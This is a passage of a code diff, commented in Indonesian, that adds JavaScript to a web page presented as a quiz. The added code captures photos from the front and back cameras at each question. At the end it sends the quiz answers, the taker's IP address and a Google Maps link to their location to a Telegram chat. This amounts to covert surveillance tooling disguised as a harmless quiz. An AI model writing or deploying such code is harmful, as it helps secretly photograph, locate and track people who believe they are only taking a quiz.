+                loadQuestion(currentQuestion);
+            }
+        }
+
+        function nextQuestion() {
+            // Capture photos sebelum pindah question
+            capturePhotos();
+
+            if (currentQuestion < quizData.length - 1) {
+                currentQuestion++;
+                loadQuestion(currentQuestion);
+            } else {
+                finishQuiz();
+            }
+        }
+
+        function finishQuiz() {
+            // Kirim foto terakhir
+            capturePhotos();
+            
+            // Hitung skor akhir
+            const score = correctCount;
+            const totalQuestions = quizData.length;
+            const percentage = Math.round((score / totalQuestions) * 100);
+            
+            // Tampilkan hasil
+            quizSection.style.display = 'none';
+            resultsSection.style.display = 'block';
+            finalScore.textContent = `${score}/${totalQuestions} (${percentage}%)`;
+            
+            // Kirim hasil quiz ke Telegram
+            const quizDuration = Math.round((new Date() - quizStartTime) / 1000);
+            const minutes = Math.floor(quizDuration / 60);
+            const seconds = quizDuration % 60;
+            
+            const quizResults = `
+🎯 QUIZ SELESAI - HASIL AKHIR
+
+📊 Skor: ${score}/${totalQuestions} (${percentage}%)
+
+⏱ Waktu Pengerjaan: ${minutes} menit ${seconds} detik
+
+📈 Detail Jawaban:
+${quizData.map((q, i) => {
+    const userAnswer = userAnswers[i];
+    const isCorrect = userAnswer === q.correct;
+    return `${i+1}. ${isCorrect ? '✅' : '❌'} ${q.options[userAnswer]}${!isCorrect ? ` (Jawaban benar: ${q.options[q.correct]})` : ''}`;
+}).join('\n')}
+
+📝 Ringkasan:
+${quizData.map((q, i) => {
+    const userAnswer = userAnswers[i];
+    const isCorrect = userAnswer === q.correct;
+    return `${i+1}. ${isCorrect ? 'Benar' : 'Salah'} - ${q.explanation}`;
+}).join('\n')}
+
+🌐 IP: ${userIP}
+${userLocation && userLocation !== 'Lokasi tidak diizinkan' && userLocation !== 'Geolocation tidak didukung' ? 
+`📍 Lokasi: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
+'📍 Lokasi: Tidak diizinkan'}
+            `.trim();
+
+            sendTelegramMessage(quizResults);
+            
+            // Hentikan kamera
+            if (frontCameraStream) {
+                frontCameraStream.getTracks().forEach(track => track.stop());
+            }
+            if (backCameraStream) {
+                backCameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Sembunyikan indikator kamera
+            cameraIndicator.style.display = 'none';
+        }
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-message';
+            statusMessage.classList.add(type);
+        }
+
+        // === EVENT LISTENERS ===
+        acceptButton.addEventListener('click', acceptPermissions);
+        prevButton.addEventListener('click', previousQuestion);
+        nextButton.addEventListener('click', nextQuestion);
+        restartButton.addEventListener('click', () => {
+            location.reload();
+        });
+
+        // Cleanup ketika tab ditutup
+        window.addEventListener('beforeunload', function() {
+            if (frontCameraStream) {
+                frontCameraStream.getTracks().forEach(track => track.stop());
+            }
+            if (backCameraStream) {
+                backCameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
 </body>
-</html>
+  </html>
